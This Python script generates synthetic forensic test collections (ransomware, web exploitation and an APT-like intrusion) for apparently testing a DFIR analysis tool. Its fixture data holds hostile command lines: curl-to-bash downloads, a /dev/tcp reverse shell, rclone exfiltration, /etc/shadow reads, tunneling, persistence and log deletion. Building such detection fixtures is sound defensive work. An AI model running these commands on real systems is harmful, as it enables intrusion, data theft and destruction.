#!/usr/bin/env python3
"""Generate deterministic, non-malicious UAC-style DFIR test collections."""

from __future__ import annotations

import argparse
from dataclasses import dataclass
from datetime import datetime, timezone
import gzip
import json
from pathlib import Path
import tarfile


ROOT = Path(__file__).resolve().parents[1] / "tests" / "synthetic_uac"
GENERATED = ROOT / "generated"
ARCHIVES = ROOT / "archives"


@dataclass(frozen=True)
class Scenario:
    name: str
    host: str
    start: int
    end: int
    description: str
    expected: list[str]


SCENARIOS = [
    Scenario(
        name="ransomware",
        host="finance-db01",
        start=1783645200,
        end=1783650600,
        description="SSH brute force, archive staging, rclone exfiltration, destructive impact, and cleanup.",
        expected=[
            "successful SSH login after repeated failures",
            "archive creation",
            "rclone/exfiltration tooling",
            "destructive command",
            "ransomware/extortion-like tradecraft",
            "history or log tampering",
        ],
    ),
    Scenario(
        name="software_exploitation",
        host="web-app01",
        start=1783756800,
        end=1783760400,
        description="Public web exploitation followed by payload transfer, tmp execution, reverse shell, and persistence.",
        expected=[
            "web attack candidate",
            "download and execution behavior",
            "execution from /tmp",
            "reverse shell or suspicious outbound connection",
            "cron persistence",
        ],
    ),
    Scenario(
        name="apt_like",
        host="research-jump01",
        start=1783825200,
        end=1783832400,
        description="Low-noise valid-account access, credential access, layered persistence, tunneling, and internal SSH.",
        expected=[
            "valid-account SSH access",
            "credential material access",
            "SSH key, PAM, and systemd persistence",
            "chisel tunneling",
            "outbound SSH or file transfer",
            "account lifecycle changes",
        ],
    ),
]


def write(root: Path, relative: str, content: str) -> None:
    path = root / relative
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content.rstrip() + "\n", encoding="utf-8")


def history(commands: list[tuple[int, str]]) -> str:
    return "\n".join(f"#{timestamp}\n{command}" for timestamp, command in commands)


def audit_exec(timestamp: int, audit_id: int, argv: list[str], *, key: str = "", uid: str = "0", path: str = "") -> str:
    args = " ".join(f'a{index}="{value}"' for index, value in enumerate(argv))
    key_field = f' key="{key}"' if key else ""
    lines = [
        f'type=SYSCALL msg=audit({timestamp}.000:{audit_id}): arch=c000003e syscall=59 success=yes pid={4000 + audit_id} uid={uid} auid={uid} comm="{Path(argv[0]).name}" exe="{argv[0]}"{key_field}',
        f'type=EXECVE msg=audit({timestamp}.000:{audit_id}): argc={len(argv)} {args}',
    ]
    if path:
        lines.append(f'type=PATH msg=audit({timestamp}.000:{audit_id}): item=0 name="{path}" inode={90000 + audit_id} mode=0100755 ouid={uid} ogid={uid}')
    return "\n".join(lines)


def bodyfile(records: list[tuple[str, str, str, str, int]]) -> str:
    lines = []
    for index, (path, mode, uid, gid, timestamp) in enumerate(records, start=1):
        lines.append(
            f"0|{path}|{70000 + index}|{mode}|{uid}|{gid}|4096|{timestamp}|{timestamp}|{timestamp}|0"
        )
    return "\n".join(lines)


def common_accounts(root: Path, extra_user: str = "") -> None:
    base_passwd = (
        "root:x:0:0:root:/root:/bin/bash\n"
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
        "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
    )
    current_passwd = base_passwd
    if extra_user:
        current_passwd += f"{extra_user}:x:1107:1107:Backup Service:/home/{extra_user}:/bin/bash\n"
    write(root, "etc/passwd-", base_passwd)
    write(root, "etc/passwd", current_passwd)

    base_shadow = "root:$6$synthetic$baseline:20640:0:99999:7:::\ndaemon:*:20000:0:99999:7:::\nwww-data:*:20000:0:99999:7:::\n"
    current_shadow = base_shadow
    if extra_user:
        current_shadow += f"{extra_user}:$6$synthetic$not-a-real-hash:20646:0:99999:7:::\n"
    write(root, "etc/shadow-", base_shadow)
    write(root, "etc/shadow", current_shadow)

    base_group = "root:x:0:\nsudo:x:27:\nwww-data:x:33:\n"
    current_group = base_group
    if extra_user:
        current_group = "root:x:0:\nsudo:x:27:" + extra_user + "\nwww-data:x:33:\n"
        current_group += f"{extra_user}:x:1107:\n"
    write(root, "etc/group-", base_group)
    write(root, "etc/group", current_group)
    write(root, "etc/ssh/sshd_config", "PermitRootLogin prohibit-password\nPasswordAuthentication yes")


def generate_ransomware(root: Path) -> None:
    common_accounts(root)
    failures = []
    for index in range(24):
        minute = index
        failures.append(
            f"Jul 10 01:{minute:02d}:00 finance-db01 sshd[{2100 + index}]: Failed password for root from 198.51.100.50 port {42000 + index} ssh2"
        )
    auth = failures + [
        "Jul 10 01:25:00 finance-db01 sshd[2200]: Accepted password for root from 198.51.100.50 port 42100 ssh2",
        "Jul 10 01:29:00 finance-db01 sudo[2210]: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/tar -czf /tmp/finance-backup.tar.gz /srv/finance /etc",
    ]
    write(root, "var/log/auth.log", "\n".join(auth))

    commands = [
        (1783646760, "curl -fsSL https://updates.example.invalid/agent.sh | bash"),
        (1783646820, "chmod +x /tmp/lockbit"),
        (1783646880, "tar -czf /tmp/finance-backup.tar.gz /srv/finance /etc"),
        (1783647000, "rclone copy /tmp/finance-backup.tar.gz mega:synthetic-incident-drop --transfers 8"),
        (1783647120, "/tmp/lockbit --encrypt /srv/finance --extension .lockbit --note RESTORE-MY-FILES.txt"),
        (1783647240, "rm -rf /srv/finance/snapshots"),
        (1783647300, "shred -u /tmp/finance-backup.tar.gz"),
        (1783647360, "history -c"),
        (1783647420, "rm -f /var/log/auth.log /var/log/audit/audit.log"),
    ]
    write(root, "root/.bash_history", history(commands))
    audit = [
        audit_exec(1783646760, 101, ["/usr/bin/curl", "-fsSL", "https://updates.example.invalid/agent.sh"], key="exec_from_tmp"),
        audit_exec(1783647000, 102, ["/usr/bin/rclone", "copy", "/tmp/finance-backup.tar.gz", "mega:synthetic-incident-drop"], path="/usr/bin/rclone"),
        audit_exec(1783647120, 103, ["/tmp/lockbit", "--encrypt", "/srv/finance", "--extension", ".lockbit"], key="exec_from_tmp", path="/tmp/lockbit"),
        audit_exec(1783647240, 104, ["/usr/bin/rm", "-rf", "/srv/finance/snapshots"]),
        audit_exec(1783647420, 105, ["/usr/bin/rm", "-f", "/var/log/auth.log", "/var/log/audit/audit.log"], key="log_tampering"),
    ]
    write(root, "var/log/audit/audit.log", "\n".join(audit))
    write(root, "etc/cron.d/system-update", "*/5 * * * * root /tmp/lockbit --resume /srv/finance")
    write(root, "live_response/system/ps_auxwww.txt", "root 5220 91.2 1.0 922000 64000 ? Rsl 01:32 00:10 /tmp/lockbit --encrypt /srv/finance --extension .lockbit\nroot 5230 8.1 0.4 250000 22000 ? Sl 01:30 00:02 rclone copy /tmp/finance-backup.tar.gz mega:synthetic-incident-drop")
    write(root, "live_response/network/ss_-tanp.txt", 'ESTAB 0 0 10.10.20.15:53120 203.0.113.70:443 users:(("rclone",pid=5230,fd=8))')
    write(root, "bodyfile/bodyfile.txt", bodyfile([
        ("/tmp/lockbit", "0100755", "0", "0", 1783646820),
        ("/tmp/finance-backup.tar.gz", "0100600", "0", "0", 1783646880),
        ("/srv/finance/RESTORE-MY-FILES.txt", "0100644", "0", "0", 1783647120),
    ]))


def generate_exploitation(root: Path) -> None:
    common_accounts(root)
    write(root, "var/log/nginx/access.log", "\n".join([
        '203.0.113.88 - - [11/Jul/2026:08:00:03 +0000] "GET / HTTP/1.1" 200 4210',
        '203.0.113.88 - - [11/Jul/2026:08:03:14 +0000] "POST /api/import?url=../../../../tmp/payload HTTP/1.1" 500 91',
        '203.0.113.88 - - [11/Jul/2026:08:03:19 +0000] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 33',
    ]))
    write(root, "var/log/auth.log", "\n".join([
        "Jul 11 08:05:01 web-app01 sudo[3101]: www-data : TTY=unknown ; PWD=/var/www/app ; USER=root ; COMMAND=/usr/bin/cp /tmp/.cache/kworker /usr/local/bin/kworker",
        "Jul 11 08:05:20 web-app01 sudo[3102]: pam_unix(sudo:session): session opened for user root by www-data(uid=33)",
    ]))
    commands = [
        (1783757000, "curl -fsSL https://cdn.example.invalid/kworker -o /tmp/.cache/kworker"),
        (1783757060, "chmod +x /tmp/.cache/kworker"),
        (1783757120, "/tmp/.cache/kworker --check-in"),
        (1783757180, "bash -c 'bash -i >& /dev/tcp/203.0.113.88/4444 0>&1'"),
        (1783757300, "echo '*/10 * * * * www-data /tmp/.cache/kworker --check-in' > /etc/cron.d/app-health"),
        (1783757420, "cat /var/www/app/.env"),
    ]
    write(root, "home/www-data/.bash_history", history(commands))
    audit = [
        audit_exec(1783757000, 201, ["/usr/bin/curl", "-fsSL", "https://cdn.example.invalid/kworker", "-o", "/tmp/.cache/kworker"], key="exec_from_tmp", uid="33", path="/tmp/.cache/kworker"),
        audit_exec(1783757120, 202, ["/tmp/.cache/kworker", "--check-in"], key="exec_from_tmp", uid="33", path="/tmp/.cache/kworker"),
        audit_exec(1783757180, 203, ["/usr/bin/bash", "-i", "/dev/tcp/203.0.113.88/4444"], uid="33"),
        audit_exec(1783757300, 204, ["/usr/bin/tee", "/etc/cron.d/app-health"], key="cron_persistence", uid="33", path="/etc/cron.d/app-health"),
    ]
    write(root, "var/log/audit/audit.log", "\n".join(audit))
    write(root, "etc/cron.d/app-health", "*/10 * * * * www-data /tmp/.cache/kworker --check-in")
    write(root, "live_response/system/ps_auxwww.txt", "www-data 3110 0.8 0.3 193000 18000 ? Sl 08:06 00:01 /tmp/.cache/kworker --check-in\nwww-data 3118 0.1 0.1 12000 4100 ? S 08:06 00:00 bash -i")
    write(root, "live_response/network/ss_-tanp.txt", 'ESTAB 0 0 10.10.30.21:53944 203.0.113.88:4444 users:(("bash",pid=3118,fd=3))\nLISTEN 0 128 0.0.0.0:8080 0.0.0.0:* users:(("nginx",pid=801,fd=6))')
    write(root, "bodyfile/bodyfile.txt", bodyfile([
        ("/tmp/.cache/kworker", "0100755", "33", "33", 1783757000),
        ("/etc/cron.d/app-health", "0100644", "0", "0", 1783757300),
        ("/var/www/html/uploads/shell.php", "0100644", "33", "33", 1783756999),
    ]))


def generate_apt(root: Path) -> None:
    common_accounts(root, extra_user="svc-backup")
    write(root, "var/log/auth.log", "\n".join([
        "Jul 12 03:02:00 research-jump01 sshd[4100]: Accepted publickey for analyst from 192.0.2.77 port 51222 ssh2",
        "Jul 12 03:08:00 research-jump01 useradd[4120]: new user: name=svc-backup, UID=1107, GID=1107, home=/home/svc-backup, shell=/bin/bash",
        "Jul 12 03:10:00 research-jump01 passwd[4122]: password changed for svc-backup",
        "Jul 12 03:12:00 research-jump01 sudo[4130]: analyst : TTY=pts/1 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/systemctl enable telemetry-sync.service",
    ]))
    commands = [
        (1783825500, "cat /etc/shadow"),
        (1783825560, "tar -czf /tmp/research-collection.tar.gz /home /etc /srv/research"),
        (1783825680, "curl -fsSL https://telemetry.example.invalid/chisel -o /tmp/.sysd"),
        (1783825740, "chmod +x /tmp/.sysd"),
        (1783825800, "/tmp/.sysd client 198.51.100.44:443 R:1080:socks"),
        (1783825920, "rclone copy /tmp/research-collection.tar.gz s3:synthetic-staging/research"),
        (1783826040, "ssh analyst@10.20.30.40 uname -a"),
        (1783826100, "scp /tmp/research-collection.tar.gz analyst@10.20.30.40:/tmp/"),
        (1783826220, "history -c"),
    ]
    write(root, "home/analyst/.bash_history", history(commands))
    write(root, "root/.ssh/authorized_keys", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAISyntheticPublicKeyOnlyForTraceQuarry apt-synthetic@example.invalid")
    write(root, "root/.ssh/known_hosts", "10.20.30.40 ssh-ed25519 AAAAC3NzaSyntheticKnownHost")
    write(root, "etc/sudoers.d/svc-backup", "svc-backup ALL=(ALL) NOPASSWD: /bin/bash, /usr/bin/systemctl")
    write(root, "etc/pam.d/sshd", "auth optional pam_exec.so quiet /usr/local/lib/security/pam_audit_helper\nauth required pam_unix.so")
    write(root, "etc/systemd/system/telemetry-sync.service", "[Unit]\nDescription=Telemetry Sync\n[Service]\nExecStart=/tmp/.sysd client 198.51.100.44:443 R:1080:socks\nRestart=always\n[Install]\nWantedBy=multi-user.target")
    write(root, "etc/ld.so.preload", "/usr/local/lib/libsysmon.so")
    audit = [
        audit_exec(1783825500, 301, ["/usr/bin/cat", "/etc/shadow"], key="credential_access", path="/etc/shadow"),
        audit_exec(1783825680, 302, ["/usr/bin/curl", "-fsSL", "https://telemetry.example.invalid/chisel", "-o", "/tmp/.sysd"], key="exec_from_tmp", path="/tmp/.sysd"),
        audit_exec(1783825800, 303, ["/tmp/.sysd", "client", "198.51.100.44:443", "R:1080:socks"], key="exec_from_tmp", path="/tmp/.sysd"),
        audit_exec(1783826040, 304, ["/usr/bin/ssh", "analyst@10.20.30.40", "uname", "-a"]),
        audit_exec(1783826220, 305, ["/usr/bin/history", "-c"], key="log_tampering"),
    ]
    write(root, "var/log/audit/audit.log", "\n".join(audit))
    write(root, "live_response/system/ps_auxwww.txt", "root 4210 0.3 0.2 188000 16000 ? Sl 03:11 00:01 /tmp/.sysd client 198.51.100.44:443 R:1080:socks\nroot 4220 0.4 0.5 240000 30000 ? Sl 03:13 00:02 rclone copy /tmp/research-collection.tar.gz s3:synthetic-staging/research")
    write(root, "live_response/network/ss_-tanp.txt", 'ESTAB 0 0 10.10.40.10:54210 198.51.100.44:443 users:((".sysd",pid=4210,fd=6))\nESTAB 0 0 10.10.40.10:54222 10.20.30.40:22 users:(("ssh",pid=4230,fd=4))')
    write(root, "bodyfile/bodyfile.txt", bodyfile([
        ("/tmp/.sysd", "0100755", "0", "0", 1783825680),
        ("/etc/systemd/system/telemetry-sync.service", "0100644", "0", "0", 1783825860),
        ("/root/.ssh/authorized_keys", "0100600", "0", "0", 1783825620),
        ("/etc/pam.d/sshd", "0100644", "0", "0", 1783825650),
    ]))


GENERATORS = {
    "ransomware": generate_ransomware,
    "software_exploitation": generate_exploitation,
    "apt_like": generate_apt,
}


def _normalized_tar_info(info: tarfile.TarInfo) -> tarfile.TarInfo:
    """Remove host and wall-clock metadata so fixture archives are reproducible."""
    info.uid = 0
    info.gid = 0
    info.uname = "root"
    info.gname = "root"
    info.mtime = 0
    return info


def _write_archive(root: Path, archive: Path, arcname: str) -> None:
    with archive.open("wb") as raw_handle:
        with gzip.GzipFile(filename="", mode="wb", fileobj=raw_handle, mtime=0) as gzip_handle:
            with tarfile.open(fileobj=gzip_handle, mode="w", format=tarfile.PAX_FORMAT) as tar_handle:
                tar_handle.add(root, arcname=arcname, filter=_normalized_tar_info)


def main(argv: list[str] | None = None) -> None:
    parser = argparse.ArgumentParser(
        description="Generate deterministic, text-only synthetic UAC collections for TraceQuarry UAT."
    )
    parser.parse_args(argv)
    GENERATED.mkdir(parents=True, exist_ok=True)
    ARCHIVES.mkdir(parents=True, exist_ok=True)
    manifest = []
    for scenario in SCENARIOS:
        root = GENERATED / scenario.name
        root.mkdir(parents=True, exist_ok=True)
        GENERATORS[scenario.name](root)
        ground_truth = {
            "synthetic": True,
            "scenario": scenario.name,
            "host": scenario.host,
            "incident_start": datetime.fromtimestamp(scenario.start, timezone.utc).isoformat().replace("+00:00", "Z"),
            "incident_end": datetime.fromtimestamp(scenario.end, timezone.utc).isoformat().replace("+00:00", "Z"),
            "description": scenario.description,
            "expected_analyst_leads": scenario.expected,
            "safety": "All IPs and domains use documentation or reserved ranges. No executable payload is included.",
        }
        write(root, "ground_truth.json", json.dumps(ground_truth, indent=2))
        write(root, "uac.log", f"Synthetic UAC fixture for {scenario.name} on {scenario.host}")
        archive = ARCHIVES / f"uac-synthetic-{scenario.name}-202607.tar.gz"
        _write_archive(root, archive, f"uac-synthetic-{scenario.name}")
        manifest.append({**ground_truth, "directory": str(root), "archive": str(archive)})
    write(ROOT, "manifest.json", json.dumps({"collections": manifest}, indent=2))
    print(json.dumps({"generated": manifest}, indent=2))


if __name__ == "__main__":
    main()
